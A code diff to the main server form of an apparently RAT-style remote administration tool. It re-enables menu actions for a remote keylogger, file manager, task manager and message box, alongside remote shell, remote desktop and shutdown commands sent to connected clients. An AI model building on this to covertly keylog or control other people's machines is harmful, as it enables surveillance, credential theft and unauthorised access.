@@ -2,10 +2,10 @@
 using Server.Forms;
 using Server.Networking;
 using Server.Networking.Packets.ClientServices;
-//using Server.Networking.Packets.MessageBox;
+using Server.Networking.Packets.MessageBox;
 using System.Net.Sockets;
 
-namespace Server.Forms
+namespace Server
 {
     public partial class FrmMain : Form
     {
@@ -15,24 +15,23 @@ namespace Server.Forms
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
+
         public FrmMain()
         {
             InitializeServer();
             InitializeComponent();
         }
 
-        //cập nhật trạng thái kết nối của client trong ListView
         private void SetStatusByClient(object sender, Client client, string text)
         {
-            var item = GetListViewItemByClient(client);// trả về dòng tương ứng với client đó
+            var item = GetListViewItemByClient(client);
             if (item != null)
                 item.SubItems[4].Text = text;
         }
 
-        //cập nhật trạng thái hoạt động của user trong ListView
         private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
         {
-            var item = GetListViewItemByClient(client);// trả về dòng tương ứng với client đó
+            var item = GetListViewItemByClient(client);
             if (item != null)
                 item.SubItems[5].Text = userStatus.ToString();
         }
@@ -219,7 +218,6 @@ namespace Server.Forms
             }
         }
 
-        //lấy các client được chọn trong ListView
         private Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
@@ -238,7 +236,7 @@ namespace Server.Forms
 
             return clients.ToArray();
         }
-        //tìm dòng tương ứng với client
+
         private ListViewItem GetListViewItemByClient(Client client)
         {
             if (client == null) return null;
@@ -254,7 +252,6 @@ namespace Server.Forms
             return itemClient;
         }
 
-        // System Information Menu Items
         private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -264,6 +261,7 @@ namespace Server.Forms
                 frmSi.Focus();
             }
         }
+
         private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -274,35 +272,35 @@ namespace Server.Forms
             }
         }
 
-        //private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
-        //{
-        //    foreach (Client c in GetSelectedClients())
-        //    {
-        //        FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
-        //        frmTm.Show();
-        //        frmTm.Focus();
-        //    }
-        //}
+        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
+                frmTm.Show();
+                frmTm.Focus();
+            }
+        }
 
-        //private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
-        //{
-        //    foreach (Client c in GetSelectedClients())
-        //    {
-        //        FrmFileManager frmTm = FrmFileManager.CreateNewOrGetExisting(c);
-        //        frmTm.Show();
-        //        frmTm.Focus();
-        //    }
-        //}
+        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager frmTm = FrmFileManager.CreateNewOrGetExisting(c);
+                frmTm.Show();
+                frmTm.Focus();
+            }
+        }
 
-        //private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
-        //{
-        //    foreach (Client c in GetSelectedClients())
-        //    {
-        //        FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
-        //        frmKl.Show();
-        //        frmKl.Focus();
-        //    }
-        //}
+        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
+                frmKl.Show();
+                frmKl.Focus();
+            }
+        }
 
         private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -338,28 +336,28 @@ namespace Server.Forms
             }
         }
 
-        //private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
-        //{
-        //    if (lstClients.SelectedItems.Count != 0)
-        //    {
-        //        using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
-        //        {
-        //            if (frm.ShowDialog() == DialogResult.OK)
-        //            {
-        //                foreach (Client c in GetSelectedClients())
-        //                {
-        //                    c.SendPacket(new ShowMessageBoxPacket
-        //                    {
-        //                        Caption = frm.MsgBoxCaption,
-        //                        Text = frm.MsgBoxText,
-        //                        Button = frm.MsgBoxButton,
-        //                        Icon = frm.MsgBoxIcon
-        //                    });
-        //                }
-        //            }
-        //        }
-        //    }
-        //}
+        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.SendPacket(new ShowMessageBoxPacket
+                            {
+                                Caption = frm.MsgBoxCaption,
+                                Text = frm.MsgBoxText,
+                                Button = frm.MsgBoxButton,
+                                Icon = frm.MsgBoxIcon
+                            });
+                        }
+                    }
+                }
+            }
+        }
 
         private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -383,11 +381,6 @@ namespace Server.Forms
             {
                 c.SendPacket(new ShutdownActionPacket { Action = ShutdownAction.Standby });
             }
-        }
-
-        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
         }
     }
 }
